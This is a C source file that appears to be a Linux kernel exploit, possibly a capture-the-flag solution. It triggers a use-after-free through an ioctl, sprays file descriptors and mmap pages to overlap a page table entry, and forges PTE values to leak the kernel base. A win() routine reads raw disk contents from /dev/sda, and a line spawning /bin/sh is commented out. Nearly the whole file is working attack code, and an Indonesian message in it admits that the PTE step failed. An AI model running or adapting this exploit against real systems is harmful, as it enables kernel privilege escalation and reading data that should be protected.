#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define SPRAY_COUNT_1 0x100
#define SPRAY_COUNT_2 0x1000


struct dma_heap_allocation_data {
    unsigned long long len;
    unsigned int fd;
    unsigned int fd_flags;
    unsigned long long heap_flags;
};


void init_cpu(void){
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        exit(EXIT_FAILURE);    
    }
}

#define BYTES_PER_LINE 16
void hexdump(const unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (i % BYTES_PER_LINE == 0) {
            printf("%06zx: ", i);
        }

        printf("%02x ", buf[i]);

        if ((i + 1) % BYTES_PER_LINE == 0 || i == len - 1) {
            printf("\n");
        }
    }
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
    puts("[+] win > _ <");
    //system("/bin/sh");
    char buf[0x100];
    int fd = open("/dev/sda", O_RDONLY);
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
}

int main(){
    init_cpu();
    save_state();
    
    int fd = open("sangu.txt",O_RDWR|O_CREAT,(mode_t)0644);
    if(fd==-1){
        puts("open error");
        exit(-1);
    }
    

    char *spray_map[SPRAY_COUNT_2*2] = {0, };
    puts("[+] Spraying mmap");
    for(int i=0;i<SPRAY_COUNT_2*2;i++){
        spray_map[i] = mmap((void*)(0x13370000UL + i*0x10000UL), 0x8000, PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED, -1, 0);
        if(spray_map[i]==MAP_FAILED){
            puts("spray mmap error");
            exit(-1);
        }
    }

    int spray_fd[SPRAY_COUNT_1*2] = {0, };
    puts("[+] Spraying fd 1");
    for(int i=0;i<SPRAY_COUNT_1;i++){
        spray_fd[i] = open("/", O_RDONLY);
        if(spray_fd[i]==-1){
            puts("spray fd 1 error");
            exit(-1);
        }
    }

    puts("[+] Trigger UAF");
    int uaf_fd = spray_fd[SPRAY_COUNT_1-1] + 1;
    ioctl(fd, 0x0, 0x0);
    printf("[+] uaf_fd : %d\n", uaf_fd);

    puts("[+] Spraying fd 2");
    for(int i=SPRAY_COUNT_1;i<SPRAY_COUNT_1*2;i++){
        spray_fd[i] = open("/", O_RDONLY);
        if(spray_fd[i]==-1){
            puts("spray fd 2 error");
            exit(-1);
        }
    }

    puts("[+] close sprayed fd");
    for(int i=0;i<SPRAY_COUNT_1*2;i++){
        close(spray_fd[i]);
    }

    puts("[+] Spraying PTE 1");
    for(int i=0;i<SPRAY_COUNT_2;i++){
        for(int ii=0;ii<8;ii++){
            spray_map[i][0x1000*ii] = 'A' + ii;
        }
    }
    printf("address: %p\n" ,(void *)spray_map);

     void *overlapped_entry = 0;
    for(int i=0;i<SPRAY_COUNT_2*2;i++){
        if(spray_map[i][0x1000*7] != ('A' + 7)){
            overlapped_entry = &(spray_map[i][0x1000*7]);
            break;
        }
    }   

    printf("address: %p\n" ,(void *)overlapped_entry);


    puts("[+] Leak Physical Address Base");
    *(unsigned long *)overlapped_entry = 0x8000000000000067 + 0x09c000;
    char *target_pte = 0;
    for(int i=0;i<SPRAY_COUNT_2*2;i++){
        if(*(unsigned long long*)spray_map[i] > 0xffff){
            target_pte = &(spray_map[i][0]);
            break;
        }
    }
    printf("PTE: %p gagal karena tidak menggunakan kebocoran memory untuk mengarahkan halaman pengguna kepada PTE\n" ,(void *)target_pte);
    unsigned long long kern_base = ((*(unsigned long*)overlapped_entry) & ~0xfff) - 0x1c04000;
    printf("PTE: %p\n" ,(void *)kern_base);
    
    return 0;
}
